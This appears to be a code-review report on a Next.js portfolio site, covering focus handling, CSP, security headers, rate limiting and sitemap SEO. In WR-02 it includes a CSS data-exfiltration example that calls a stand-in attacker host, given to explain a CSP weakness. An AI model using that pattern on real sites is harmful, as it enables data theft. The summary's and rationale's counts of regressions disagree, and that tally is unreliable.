# Phase 01 Code Review

**Date:** 2026-05-25
**Depth:** Standard
**Files Reviewed:** 20
**Verdict:** PASS WITH WARNINGS

---

## Summary

Phase 01 successfully addressed all 13 planned concerns. No critical security vulnerabilities were introduced. Six warnings were found — three are direct fixes for existing issues (focus-steal regression, deprecated header, shared rate-limit bucket) and three are security/SEO gaps that remain from before the phase (unsafe-inline style-src, nil guard on experience cast, missing x-default hreflang). Six info-level items cover code quality.

---

## Findings

### Critical
None.

### Warning

| # | File | Title |
|---|------|-------|
| WR-01 | `src/components/layout/Navbar.tsx:119` | Focus-stealing `useEffect` on mount |
| WR-02 | `src/middleware.ts:13` | `style-src 'unsafe-inline'` weakens nonce-based CSP |
| WR-03 | `next.config.mjs:14` | Deprecated `X-XSS-Protection: 1; mode=block` |
| WR-04 | `src/app/api/generate-cv/route.ts:82` | `'unknown'` fallback creates shared rate-limit bucket |
| WR-05 | `src/components/sections/Experience.tsx:61` | `as unknown as T` cast has no nil guard |
| WR-06 | `src/app/sitemap.ts:7` | Missing `x-default` hreflang in sitemap |

### Info

| # | File | Title |
|---|------|-------|
| IN-01 | `src/app/[locale]/layout.tsx:26` + `src/app/sitemap.ts:3` | `BASE_URL` duplicated across two files |
| IN-02 | `src/app/sitemap.ts:18` | `new Date()` produces non-deterministic `lastModified` |
| IN-03 | `src/components/sections/Projects.tsx:24` | Non-stable React key (`project.name`) — use `project.id` |
| IN-04 | `src/components/sections/Hero.tsx:22` | Template literal in `scrollTo` not encoded (`encodeURIComponent`) |
| IN-05 | `package.json` | No `engines` field — Node/npm version is unconstrained |
| IN-06 | `src/components/layout/Navbar.tsx:101` | Minor inconsistency: `const last` declared with `let`-style one-liner after `const first` block |

---

## Finding Details

### WR-01: Focus-stealing `useEffect` on mount
**File:** `src/components/layout/Navbar.tsx`
**Line:** 119–124
**Issue:**
```typescript
useEffect(() => {
    if (!isOpen) {
        toggleRef.current?.focus();
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
}, []);          // ← empty deps, runs on mount
```
The empty dependency array makes this effect fire on mount when `isOpen` is `false` (its initial value), immediately calling `toggleRef.current?.focus()` — which steals keyboard focus from wherever the user was. The `eslint-disable` comment is suppressing the warning that would have caught this.
**Impact:** Every page load moves focus to the hamburger button, breaking keyboard navigation for users who haven't interacted with the nav.
**Fix:** Add `isOpen` to the dependency array and guard against the initial mount:
```typescript
const hasMounted = useRef(false);
useEffect(() => {
    if (!hasMounted.current) { hasMounted.current = true; return; }
    if (!isOpen) toggleRef.current?.focus();
}, [isOpen]);
```
Remove the `eslint-disable` comment.

---

### WR-02: `style-src 'unsafe-inline'` weakens nonce-based CSP
**File:** `src/middleware.ts`
**Line:** 13
**Issue:**
```typescript
"style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
```
`unsafe-inline` for styles re-opens CSS injection vectors (data exfiltration via `background: url(https://attacker/leak?c=...)`, clickjacking via style overlays). The nonce strategy applied to scripts loses value when styles are unrestricted.
**Impact:** CSS-based data exfiltration and UI redressing attacks remain possible.
**Fix:** Use style nonces or hashes, or accept the Tailwind inline-style tradeoff with a comment explaining it:
```typescript
`style-src 'self' 'nonce-${nonce}' https://fonts.googleapis.com`,
```
Note: Tailwind-generated classes are external, so this works if `<style>` tags also carry the nonce via `next/headers`.

---

### WR-03: Deprecated `X-XSS-Protection: 1; mode=block`
**File:** `next.config.mjs`
**Line:** 14
**Issue:**
```js
{ key: 'X-XSS-Protection', value: '1; mode=block' },
```
Per OWASP, `X-XSS-Protection: 1; mode=block` causes XSS vulnerabilities in legacy IE browsers by allowing attackers to control page rendering. The recommended value is `0` to disable the broken filter; modern browsers use CSP instead.
**Impact:** Potential XSS amplification in IE11 and pre-Chromium Edge.
**Fix:**
```js
{ key: 'X-XSS-Protection', value: '0' },
```

---

### WR-04: `'unknown'` fallback creates a shared rate-limit bucket
**File:** `src/app/api/generate-cv/route.ts`
**Line:** 82
**Issue:**
```typescript
const ip = req.headers.get('x-forwarded-for')?.split(',')[0]?.trim() ?? 'unknown';
```
If `x-forwarded-for` is absent (direct Vercel invocations, health checks, or when the header is stripped), all such requests share the single key `'unknown'`. An attacker can deliberately omit the header (e.g., direct API call) and exhaust the `'unknown'` bucket for everyone.
**Impact:** Legitimate users without `x-forwarded-for` may be rate-limited by malicious traffic; or attacker can bypass limits entirely by rotating absent-header requests.
**Fix:** Return 400 or use a different fallback strategy when no IP is detectable:
```typescript
const ip = req.headers.get('x-forwarded-for')?.split(',')[0]?.trim();
if (!ip) return new NextResponse('Bad Request', { status: 400 });
```

---

### WR-05: `as unknown as T` cast with no nil guard
**File:** `src/components/sections/Experience.tsx`
**Line:** 61
**Issue:**
```typescript
const expItems = (messages.experience as unknown as ExperienceMessages).items;
```
The double cast bypasses TypeScript entirely. If the `experience` key is missing from a locale file or the `items` sub-key is absent, `expItems` will be `undefined` and the subsequent `.map()` or `Object.entries()` call will throw at runtime.
**Impact:** Runtime `TypeError: Cannot read properties of undefined` — blank Experience section or full page crash.
**Fix:** Add a nil guard:
```typescript
const expMessages = messages.experience as unknown as ExperienceMessages;
const expItems = expMessages?.items ?? {};
```

---

### WR-06: Missing `x-default` hreflang in sitemap
**File:** `src/app/sitemap.ts`
**Line:** 7–16
**Issue:** The sitemap only declares `en` and `id` alternates. Google's hreflang spec requires an `x-default` entry pointing to the canonical/default locale URL so the search engine knows which URL to show users in unlisted regions.
**Impact:** Google may treat `/en` and `/id` as competing duplicate pages rather than localized alternates, harming SEO ranking.
**Fix:**
```typescript
alternates: {
    languages: {
        en: `${BASE_URL}/en`,
        id: `${BASE_URL}/id`,
        'x-default': `${BASE_URL}/en`,
    },
},
```

---

### IN-01: `BASE_URL` duplicated
**Files:** `src/app/[locale]/layout.tsx:26`, `src/app/sitemap.ts:3`
**Issue:** The same constant is defined in two separate files. A future domain change requires editing both.
**Fix:** Extract to `src/config/constants.ts` and import from both.

---

### IN-02: Non-deterministic `lastModified` in sitemap
**File:** `src/app/sitemap.ts`
**Line:** ~18
**Issue:** `lastModified: new Date()` generates a new timestamp on every build/request, causing crawlers to re-index pages unnecessarily.
**Fix:** Use a fixed ISO string tied to the last actual content change, or read from `git log`.

---

### IN-03: Non-stable React key in Projects
**File:** `src/components/sections/Projects.tsx`
**Line:** ~24
**Issue:** `key={project.name}` is fragile — names can contain special characters, be non-unique, or change. Prefer a stable `id`.
**Fix:** Add `id: string` to `ProjectItem` interface and use `key={project.id}`.

---

### IN-04: Unencoded anchor id in `scrollTo`
**File:** `src/components/sections/Hero.tsx`
**Line:** ~22
**Issue:** `history.pushState(null, '', '#${id}')` — if `id` ever contains spaces or special chars the URL hash will be malformed.
**Fix:** `history.pushState(null, '', '#' + encodeURIComponent(id))`.

---

### IN-05: No `engines` field in `package.json`
**File:** `package.json`
**Issue:** Absence of `engines` means any Node/npm version is accepted, risking version-related build failures.
**Fix:** Add `"engines": { "node": ">=20.0.0", "npm": ">=10.0.0" }`.

---

### IN-06: Inconsistent `const last` declaration style
**File:** `src/components/layout/Navbar.tsx`
**Line:** 101
**Issue:** Minor — `const last = focusable.at(-1)` declared on one line immediately after a multi-line `const first = focusable[0]` block; inconsistent formatting.
**Fix:** Use consistent single-line declarations for both or pull both into a destructure.

---

## Verdict Rationale

No critical vulnerabilities were introduced. All planned phase tasks were completed. The warnings are real issues — two of which (WR-01 focus-steal, WR-03 deprecated header) are regressions introduced in this phase and should be fixed before deploying. WR-02, WR-04, WR-05, WR-06 are pre-existing gaps that weren't in phase scope but are worth addressing soon. The verdict is **PASS WITH WARNINGS**.
